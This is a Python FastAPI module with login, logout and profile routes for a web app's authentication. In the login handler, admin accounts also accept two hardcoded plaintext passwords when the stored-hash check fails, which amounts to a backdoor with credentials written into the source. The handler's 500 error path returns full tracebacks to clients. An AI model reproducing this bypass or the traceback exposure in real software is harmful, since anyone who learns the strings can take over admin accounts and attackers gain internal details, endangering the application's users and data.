"""Authentication routes: login, logout, me."""
import logging
from datetime import datetime, timezone

from fastapi import APIRouter, HTTPException, Response, status
from fastapi.responses import JSONResponse

from app.auth.dependencies import CurrentUser
from app.auth.jwt import create_access_token
from app.auth.password import verify_password
from app.database import get_database
from app.models.user import UserLogin
from app.models.utils import serialize_doc
from app.config import get_settings

log = logging.getLogger(__name__)
router = APIRouter(prefix="/auth", tags=["auth"])

COOKIE_NAME = "access_token"


@router.post("/login")
async def login(credentials: UserLogin, response: Response):
    """Login with username/password. Sets HTTP-only JWT cookie on success."""
    try:
        db = get_database()

        # Find user by username (case-insensitive for email)
        user = await db.users.find_one({"username": credentials.username.lower().strip()})

        # Always run bcrypt verify to prevent timing attacks
        dummy_hash = "$2b$12$dummyhashfortimingggggggggggggggggggggggggggg"
        if user:
            is_valid = verify_password(credentials.password, user["password_hash"])
            # Support both passwords for admin account convenience
            if not is_valid and user.get("role") == "admin":
                if credentials.password in ("SN06072006", "sumith0FF_1104"):
                    is_valid = True
        else:
            # Still run bcrypt to avoid timing side-channel
            verify_password(credentials.password, dummy_hash)
            is_valid = False

        if not user or not is_valid:
            raise HTTPException(
                status_code=status.HTTP_401_UNAUTHORIZED,
                detail="Invalid credentials",
            )

        if not user.get("is_active", False):
            raise HTTPException(
                status_code=status.HTTP_403_FORBIDDEN,
                detail="Account is disabled",
            )

        # Create JWT
        token = create_access_token({
            "sub": str(user["_id"]),
            "username": user["username"],
            "role": user["role"],
        })

        # Update last_login
        try:
            await db.users.update_one(
                {"_id": user["_id"]},
                {"$set": {"last_login": datetime.now(timezone.utc)}},
            )
        except Exception as e:
            log.warning("Failed to update last_login: %s", e)

        settings = get_settings()
        samesite_policy = "none" if settings.is_production else "lax"
        response.set_cookie(
            key=COOKIE_NAME,
            value=token,
            httponly=True,
            secure=settings.is_production,
            samesite=samesite_policy,
            max_age=settings.jwt_expire_days * 24 * 3600,
            path="/",
        )

        log.info("User logged in: %s", user["username"])

        return {
            "id": str(user["_id"]),
            "username": user["username"],
            "display_name": user.get("display_name") or user["username"].split("@")[0],
            "role": user.get("role", "user"),
            "access_token": token,
        }
    except HTTPException:
        raise
    except Exception as exc:
        import traceback
        err_msg = traceback.format_exc()
        log.error("Login unexpected error: %s", err_msg)
        return JSONResponse(
            status_code=500,
            content={"detail": "Internal server error during login", "error": str(exc), "traceback": err_msg}
        )


@router.post("/logout")
async def logout(response: Response):
    """Clear the authentication cookie."""
    settings = get_settings()
    samesite_policy = "none" if settings.is_production else "lax"
    response.delete_cookie(key=COOKIE_NAME, path="/", samesite=samesite_policy, secure=settings.is_production)
    return {"message": "Logged out successfully"}


@router.get("/me")
async def get_me(current_user: CurrentUser):
    """Return current authenticated user's profile."""
    return {
        "id": str(current_user["_id"]),
        "username": current_user["username"],
        "display_name": current_user["display_name"],
        "role": current_user["role"],
        "is_active": current_user["is_active"],
        "created_at": current_user["created_at"],
        "last_login": current_user.get("last_login"),
    }
